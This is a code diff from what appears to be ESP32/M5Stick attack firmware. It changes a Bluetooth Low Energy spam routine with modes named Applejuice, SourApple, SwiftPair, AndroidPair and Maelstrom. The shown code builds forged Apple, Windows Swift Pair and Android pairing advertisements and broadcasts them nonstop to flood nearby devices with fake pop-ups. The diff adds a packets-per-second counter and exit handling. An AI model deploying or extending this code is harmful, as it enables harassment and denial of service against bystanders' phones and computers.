@@ -280,44 +280,40 @@ void aj_adv(int ble_choice){
   bool androidPair;
   bool sourApple;
   bool maelstrom;
-  int advtime;
 
   switch(ble_choice){
     case 0:
       data = Airpods;
       sourApple = true;
-      displayRedStripe("Applejuice");
+      displayRedStripe("Applejuice",TFT_WHITE,FGCOLOR);
       delay(500);
       break;
     case 1:
       swiftPair = true;
-      displayRedStripe("SwiftPair");
+      displayRedStripe("SwiftPair",TFT_WHITE,FGCOLOR);
       delay(500);
       break;
     case 2:
       androidPair = true;
-      displayRedStripe("AndroidPair");
+      displayRedStripe("AndroidPair",TFT_WHITE,FGCOLOR);
       delay(500);
       break;
     case 3:
       sourApple = true;
       data = AppleTVPair;
-      displayRedStripe("SourApple");
+      displayRedStripe("SourApple",TFT_WHITE,FGCOLOR);
       delay(500);
       break;
     case 4:
       maelstrom = true;
-      displayRedStripe("Maelstrom");
+      displayRedStripe("Maelstrom",TFT_WHITE,FGCOLOR);
       delay(500);
       break;
   }
+  int count = 0;
+  int tmp = 0;
+  tmp=millis();
   for(;;){
-    if (sourApple || swiftPair || androidPair || maelstrom){
-      delay(20);   // 20msec delay instead of ajDelay for SourApple attack
-      advtime = 0; // bypass ajDelay counter
-    }
-    if (millis() > advtime ){
-      advtime = millis();
       pAdvertising->stop(); // This is placed here mostly for timing.
                             // It allows the BLE beacon to run through the loop.
       BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
@@ -344,6 +340,7 @@ void aj_adv(int ble_choice){
         packet[i++] =  0x10;  // Type ???
         esp_fill_random(&packet[i], 3);
         oAdvertisementData.addData(std::string((char *)packet, 17));
+        count++;
         for (int i = 0; i < sizeof packet; i ++) {
           Serial.printf("%02x", packet[i]);
         }
@@ -371,6 +368,7 @@ void aj_adv(int ble_choice){
 
         i += display_name_len;  
         oAdvertisementData.addData(std::string((char *)packet, size));
+        count++;
         free(packet);
         free((void*)display_name);
       } else if (androidPair) {
@@ -394,6 +392,7 @@ void aj_adv(int ble_choice){
         packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
         oAdvertisementData.addData(std::string((char *)packet, 14));
+        count++;
         for (int i = 0; i < sizeof packet; i ++) {
           Serial.printf("%02x", packet[i]);
         }
@@ -402,8 +401,10 @@ void aj_adv(int ble_choice){
         Serial.print("ADV");
         if (deviceType >= 18){
           oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+          count++;
         } else {
           oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+          count++;
         }
         for (int i = 0; i < sizeof(Airpods); i ++) {
           Serial.printf("%02x", data[i]);
@@ -418,7 +419,16 @@ void aj_adv(int ble_choice){
       delay(10);
       digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
   #endif
-    }
+
+      if(millis()-tmp>1000) {
+        tft.setCursor(0,0);
+        tft.setTextColor(TFT_WHITE, BGCOLOR);
+        tft.setTextSize(2);
+        tft.print("Packets: " + String(count) + "/s");
+        count=0;
+        tmp=millis();
+      }
+
     if (checkSelPress()) {
 
       sourApple = false;
@@ -428,6 +438,18 @@ void aj_adv(int ble_choice){
       BLEDevice::deinit();
       delay(250);
     }
+      // Checks para sair do while
+      #ifndef CARDPUTER
+        if(checkPrevPress()) break; // Apertar o botão power dos sticks
+      #else
+        Keyboard.update();
+        if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
+      #endif
 
   }
+  pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
+  BLEDevice::deinit();
+  delay(200);
+  tft.fillScreen(TFT_BLACK);
+  returnToMenu=true;
 }
